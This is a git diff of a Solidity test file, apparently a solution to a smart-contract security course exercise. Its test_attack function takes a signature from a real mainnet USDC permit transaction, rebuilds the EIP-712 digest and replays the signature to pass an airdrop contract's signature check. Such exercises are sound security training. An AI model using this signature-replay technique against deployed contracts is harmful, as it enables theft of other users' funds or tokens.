@@ -38,93 +38,66 @@ contract Week22Exercise4Test is TestHelpers {
     //     exercise.claimAirdrop(100, msgHash, signature);
     // }
 
+    function getTypeHashData() internal pure returns (bytes memory typehashAndData) {
+        bytes32 a = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
+        bytes32 b = 0x000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d96;
+        bytes32 c = 0x00000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc45;
+        bytes32 d = 0x0000000000000000000000000000000000000000000000000000000002f82754;
+        bytes32 e = 0x0000000000000000000000000000000000000000000000000000000000000000;
+        bytes32 f = 0x00000000000000000000000000000000000000000000000000000000635222b7;
+
+
+        bytes memory typehashAndData = abi.encodePacked(a, b, c, d, e, f);
+        return typehashAndData;
+    }
+
     function test_attack() public {
-        AdditionalRecipient memory recipient1 = AdditionalRecipient({
-            amount: 2375000000000000,
-            recipient: payable(0x0000a26b00c1F0DF003000390027140000fAa719)
-        });
+        // ORDER is (r, s) = abi.decode(signature, (bytes32, bytes32));
+        bytes32 r = 0xd0e5696f21d14218bff84c8818dbe6c79812f6fdda9424a7efec907c6d7ef002;
+        bytes32 s = 0x70b6afeb66a51f42881763c7a19d8e1421b9b5fc0200cd4cee06a1a9a4d3207f;
+        uint8 v = 28;
 
-        AdditionalRecipient memory recipient2 = AdditionalRecipient({
-            amount: 4750000000000000,
-            recipient: payable(0xCa812530A5A97f2cfb321fBD6F40Da292E9F2045)
-        });
 
-        AdditionalRecipient[]
-            memory additionalRecipients = new AdditionalRecipient[](2);
+        bytes memory signature = abi.encodePacked(r, s, v);
 
-        additionalRecipients[0] = recipient1;
-        additionalRecipients[1] = recipient2;
+        bytes32 domainSeparator = 0x06c37168a7db5138defc7866392bb87a741f9b3d104deb5094588ce041cae335;
 
-        bytes32 startOfSig = 0x5fb612dac8b3b7fc4c4bc4609998000a783483828baaee7e24253582dcfadb01;
-        bytes32 middleOfSig = 0x335f6e690f6d8c327769fe53b0fc04fca9bca95ad117985c1c732ff4a6c65a37;
-        bytes1 endOfSig = 0x1c;
 
-        bytes memory signature = abi.encodePacked(
-            startOfSig,
-            middleOfSig,
-            endOfSig
+
+        bytes32 hashStruct = keccak256(getTypeHashData());
+
+        bytes32 digest = keccak256(
+            abi.encodePacked("\x19\x01", domainSeparator, hashStruct)
         );
 
-        // https://etherscan.io/tx/0x9808718ce84cdcd342b106f39b72be690befa3f0a019a58439cdfa67f786879f
 
-        BasicOrderParameters memory parameters = BasicOrderParameters({
-            considerationToken: address(0),
-            considerationIdentifier: 0,
-            considerationAmount: 87875000000000000,
-            offerer: payable(0x818c516C046EAf7a5A432E50eEE11c46BCa03Fcb),
-            zone: address(0x004C00500000aD104D7DBd00e3ae0A5C00560C00),
-            offerToken: address(0x62674b8aCe7D939bB07bea6d32c55b74650e0eaA),
-            offerIdentifier: 6580,
-            offerAmount: 1,
-            basicOrderType: BasicOrderType(2),
-            startTime: 1666268463,
-            endTime: 1668946863,
-            zoneHash: bytes32(0),
-            salt: 24446860302761739304752683030156737591518664810215442929803392085919972899734,
-            offererConduitKey: bytes32(
-                0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000
-            ),
-            fulfillerConduitKey: bytes32(
-                0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000
-            ),
-            totalOriginalAdditionalRecipients: 2,
-            additionalRecipients: additionalRecipients,
-            signature: signature
-        });
+        address recoveredSigner = ecrecover(digest, v, r, s);
+        console2.log("recoveredSigner: ", recoveredSigner);
 
-        // hashes.typeHash = _ORDER_TYPEHASH;
-
-        bytes32 orderHash = 0x3037da4e9949ec07389964478ca398fa059940f23f4e5dff31c2bfedcde9994e;
-
-        address offerer = address(0x818c516C046EAf7a5A432E50eEE11c46BCa03Fcb);
-
-        bytes32 digest = _verifySignature(offerer, orderHash, signature);
+        // bytes32 digest = _verifySignature(offerer, orderHash, signature);
 
         exercise.claimAirdrop(100, digest, signature);
 
-        // hashes.orderHash = _hashOrder(
-        //     hashes,
-        //     parameters,
-        //     fulfillmentItemTypes
-        // );
     }
 }
 
-// 0	parameters.considerationToken	address	0x0000000000000000000000000000000000000000
-// 0	parameters.considerationIdentifier	uint256	0
-// 0	parameters.considerationAmount	uint256	87875000000000000
-// 0	parameters.offerer	address	0x818c516C046EAf7a5A432E50eEE11c46BCa03Fcb
-// 0	parameters.zone	address	0x004C00500000aD104D7DBd00e3ae0A5C00560C00
-// 0	parameters.offerToken	address	0x62674b8aCe7D939bB07bea6d32c55b74650e0eaA
-// 0	parameters.offerIdentifier	uint256	6580
-// 0	parameters.offerAmount	uint256	1
-// 0	parameters.basicOrderType	uint8	2
-// 0	parameters.startTime	uint256	1666268463
-// 0	parameters.endTime	uint256	1668946863
-// 0	parameters.zoneHash	bytes32	0x0000000000000000000000000000000000000000000000000000000000000000
-// 0	parameters.salt	uint256	24446860302761739304752683030156737591518664810215442929803392085919972899734
-// 0	parameters.offererConduitKey	bytes32	0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000
-// 0	parameters.fulfillerConduitKey	bytes32	0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000
-// 0	parameters.totalOriginalAdditionalRecipients	uint256	2
-// 0	parameters.additionalRecipients	tuple	2375000000000000,0x0000a26b00c1F0DF003000390027140000fAa719,4750000000000000,0xCa812530A5A97f2cfb321fBD6F40Da292E9F2045
-// 0	parameters.signature	bytes	0x5fb612dac8b3b7fc4c4bc4609998000a783483828baaee7e24253582dcfadb01335f6e690f6d8c327769fe53b0fc04fca9bca95ad117985c1c732ff4a6c65a371c
+// typehash and data
+// 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d9600000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc450000000000000000000000000000000000000000000000000000000002f82754000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000635222b7;
+// 6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d9600000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc450000000000000000000000000000000000000000000000000000000002f82754000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000635222b7;
+
+// 6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9
+// 000000000000000000000000b1700c08aa433b319def2b4bb31d6de5c8512d96
+// 00000000000000000000000068b3465833fb72a70ecdf485e0e4c7bd8665fc45
+// 0000000000000000000000000000000000000000000000000000000002f82754
+// 0000000000000000000000000000000000000000000000000000000000000000
+// 00000000000000000000000000000000000000000000000000000000635222b7
+
+// https://etherscan.io/tx/0x9050798d7989583632defa0c26e42d9fdfc30a66aa016fea849af303d7eda969
+
+// 1	token	address	0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
+// 2	value	uint256	49817428
+// 3	deadline	uint256	1666327223
+
+// 4	v	uint8	28
+// 5	r	bytes32	0xd0e5696f21d14218bff84c8818dbe6c79812f6fdda9424a7efec907c6d7ef002
+// 6	s	bytes32	0x70b6afeb66a51f42881763c7a19d8e1421b9b5fc0200cd4cee06a1a9a4d3207f
